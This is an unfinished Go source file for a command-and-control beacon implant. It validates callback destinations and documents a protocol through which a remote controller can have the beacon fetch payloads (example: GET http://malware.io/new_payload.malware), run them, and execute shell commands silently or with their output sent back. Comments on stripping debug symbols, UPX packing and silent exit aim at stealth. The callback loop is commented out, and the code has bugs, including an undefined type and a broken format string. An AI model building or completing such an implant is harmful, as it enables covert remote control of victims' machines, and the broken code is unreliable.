package beacons

// TODO: Figure out how to validate build before deploying (since we're using build arguments instead of runtime arguments for configuration values)

// TODO: Use conditional compilation for debug mode (or iplement a pre-processor / build script which will strip out everything to do with debug-mode, including the fmt import)
import (
	"fmt"
	//"io/ioutil"
	//"net/http"
	"os"
	"strconv"
	"strings"
	//"time"
	"regexp"
	"lib"
)

var ipAddrRegex = regexp.MustCompile(`^([0-9]{1,3}\.){3}[0-9]{1,3}\:[0-9]{1,5}$`)
var urlRegex = regexp.MustCompile(`^http(s?)\://.*$`)
var portNumRegex = regexp.MustCompile(`^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$`)
var clientTokenRegex = regexp.MustCompile(`[0-9a-zA-Z]+`)

// TODO: Integrate into build script

/**
 * To build, run the following command:
 *
 * go build -o simple_http_beacon.exe -ldflags "-w -s -X main.dst=http://www.test.com ..." simple_http_beacon.go
 *
 * The -w flag is used to exclude debugging information, which helps to shrink the final binary size
 *
 * Can also use the upx utility on Linux to pack and then unpack the binary (to make it smaller on the wire)
 *
 * TODO: Figure out the cross-compilation stuff; the -s flag also helps shrink the binary size.
 */

//
// Build flags
//

var debugMode = false

// Can be one or more IP:port pairs and/or URL's, separated by commas, which the beacon should call back too.
// If more than one value is provided, beacon will rotate through the different callback destinations.
// Will use port 80 for HTTP URL's and port 443 for HTTPS URL's.
// At least one value is required
var dst string = ""

// Unique alpha-numeric string to identify this beacon. Must be provided.
var clientToken string = ""

// TODO: Add support for enabling randomized jitter on callback time
// How often the beacon should attempt to callback (in seconds).
// Default is once every five minutes.
// Has to be a string in order for this value to be accessible as a build argument
var callbackInterval string = "300"

/*

Beacon Action Request Format:

[ACTION] [DETAILS]

Examples:

GET http://malware.io/new_payload.malware
EXECUTE [SHELL COMMAND]

Supported Actions:

* GET [URL] [file:<LOCAL DOWNLOAD LOCATION>]: Have the beacon stage a new payload (but do not run)
* RUN [url:URL | file:<LOCAL FILE LOCATION>]: Have the beacon run the specified payload (will first download the payload if a URL is provided)
* EXECUTE [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s) and send the output back
* EXECUTE_SILENT [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s), but will *not* send the output back
* CONFIGURE [CONFIGURATION NAME] [CONFIGURATION VALUE]: Change configuration value
*/

func parse_response_body(body string) {
	// TODO: Implement
}

// func init() {
// 	// flag.IntVar(&dstPort, "dstPort", 9090, "Set the port to call back to; defaults to port 9090")
// 	// flag.StringVar(&dstHost, "dstHost", "", "The host to callback to. Can be either an IP address or a hostname. Required value.")
// 	// flag.StringVar(&clientToken, "clientToken", "", "Unique string to identify this beacon. Required value.")
// 	// flag.IntVar(&callbackInterval, "callbackInterval", 300, "How often to callback to the server (in seconds); default is to callback once every 300 seconds (5 minutes).")

// 	// If required ldflags (load flags) are not provided, simply exit silently
// 	if dstHost == "" || clientToken == "" {
// 		//fmt.Printf("\nUSAGE: simple_http_beacon -dst='<listener host>' -port=<dst port> -token='<unique ID token>' -sleep=<time between callbacks in seconds>\n")
// 		os.Exit(0)
// 	}
// }

func isValidIpAddr(ipStr string) (bool) {
	return ipAddrRegex.Match([]byte(ipStr))
}

func isValidUrl(urlStr string) (bool) {
	return urlRegex.Match([]byte(urlStr))
}

func isValidPortNumber(portNumStr string) (bool) {
	// Reference: https://stackoverflow.com/questions/12968093/regex-to-validate-port-number
	return portNumRegex.Match([]byte(portNumStr))
}

func isValidClientToken(clientToken string) (bool) {
	return clientTokenRegex.Match([]byte(clientToken))
}

func parseDstStr(dst string) ([]Destination, error) {
	if dst == "" {
		return nil, fmt.Errorf("Destination string (dst) is required")
	}

	var destinations []Destination = nil
	for _, dstStr := range strings.Split(dst, ",") {
		var destination = Destination{}
		
		if isValidUrl(dstStr) {
			destination.Url = dstStr
			
			if strings.HasPrefix(dstStr, "https") {
				destination.Port = 443
			} else {
				destination.Port = 80
			}
		} else {
			var dstComponents = strings.Split(dstStr, ":")
		
			if len(dstComponents) != 2 {
				return nil, fmt.Errorf("Invalid destination '%s'", dstStr)
			}
		
			var ipAddr string = dstComponents[0]
			var portNumStr string = dstComponents[1]

			if !isValidPortNumber(portNumStr) {
				return nil, fmt.Errorf("Invalid port number '%s'", portNumStr)
			}

			if !isValidIpAddr(ipAddr) {
				return nil, fmt.Errorf("Invalid IP address '%s'", ipAddr)
			}

			portNum, err := strconv.Atoi(portNumStr)
			
			if err != nil {
				return nil, fmt.Errorf("Invalid port number '%s': %s", portNumStr, err)
			}
			
			destination.Port = portNum
			destination.Ip = ipAddr
		}

		destinations = append(destinations, destination)
	}

	return destinations, nil
}

// TODO: Add in event handling loop for handling calls from C2 -> the beacon
// TODO: Add unit testing
func main() {
	// TODO: Catch any errors and fail silently / do self-cleanup
	// TODO: Validate required values have been specified

	destinations, err := parseDstStr(dst)
	
	if err != nil {
		fmt.Printf("Unable to parse dst value: %s\n", err)
		os.Exit(1)
	}

	if destinations == nil || len(destinations) == 0 {
		fmt.Println("Must provide at least one callback destination")
		os.Exit(1)
	}

	if clientToken == "" {
		fmt.Println("clientToken value must be provided")
		os.Exit(1)
	}
	
	if !isValidClientToken(clientToken) {
		fmt.Printf("Invalid client token ''\n", clientToken)
		os.Exit(1)
	}

	interval, err := strconv.Atoi(callbackInterval)

	if err != nil {
		fmt.Printf("Invalid callbackInterval value of '%s'; value must be an integer\n", callbackInterval)
		os.Exit(1)
	}

	// TODO: Continue
	fmt.Printf("Callback interval: %d\n", interval)
	
	// if debugMode {
	// 	fmt.Println("Starting beacon with sleep interval of ", strconv.Itoa(callbackInterval), "...")
	// }

	// for index, destination := range destinations {
	// var dst_url = "http://" + dstHost + ":" + strconv.Itoa(dstPort) + "/" + clientToken

	// if debugMode {
	// 	fmt.Println("DST URL:", dst_url)
	// }
	
	// Go's version of a while-true loop
	// for {
	// 	if debugMode {
	// 		fmt.Println("Sending GET request to", dst_url)
	// 	}
	// 	resp, err := http.Get(dst_url)

	// 	if err == nil {
	// 		body, err := ioutil.ReadAll(resp.Body)

	// 		if err == nil {
	// 			// TODO: Handle response properly
	// 			fmt.Println("Got response: " + string(body))
	// 		} else if debugMode {
	// 			fmt.Println("ERROR:", err)
	// 		}

	// 		resp.Body.Close()
	// 	} else if debugMode {
	// 		fmt.Println("ERROR:", err)
	// 	}

	// 	time.Sleep(time.Duration(callbackInterval) * time.Second)
	// }
}
